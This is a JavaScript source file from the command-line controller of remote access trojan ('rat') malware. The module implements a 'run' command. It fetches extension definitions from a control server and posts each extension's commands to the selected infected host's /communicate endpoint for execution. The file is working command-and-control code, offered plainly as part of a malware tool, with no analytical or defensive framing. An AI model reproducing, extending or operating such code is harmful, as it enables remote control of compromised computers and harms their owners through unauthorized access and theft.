const axios = require("axios").default;

module.exports = class RunCommand {

    constructor() {
        this.name = "run";
        this.description = "Run an extension on the rat";
    };

    async run({ server, cli, args }) {
        if (!cli.rat) return console.log("No rat selected use connect to select a rat");
        if (!server.has(cli.rat)) return cli.rat = null;
        if (!args.length) return console.log("No extension was provided in arguments");
        const extensions = (await axios.get(`http://${process.env.HOST}/extensions`)).data;
        if (!extensions.length) return console.log("No extensions were found");
        for (const extension of extensions) {
            if (`${extension.name}@${extension.version}` != args[0]) continue;
            for (const command of extension.run) {
                axios.post(`http://${cli.rat}:${server.get(cli.rat)}/communicate`, {
                    command: command
                });
            };

            return console.log(`Ran ${extension.name} (${extension.type})`);
        };

        return console.log(`Extension not found: ${args[0]}`);
    };

};